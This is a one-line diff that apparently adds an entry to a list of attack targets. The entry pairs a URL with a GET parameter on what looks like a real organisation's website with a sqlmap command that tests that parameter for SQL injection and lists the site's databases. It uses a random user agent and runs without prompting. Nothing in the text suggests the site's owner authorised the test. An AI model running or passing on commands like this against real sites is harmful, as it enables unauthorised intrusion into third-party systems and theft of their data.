@@ -1,0 +1,1 @@
+http://www.avrdc.org/index.php?id=1 (GET)  # sqlmap.py -u http://www.avrdc.org/index.php?id=1 --random-agent --batch --dbs
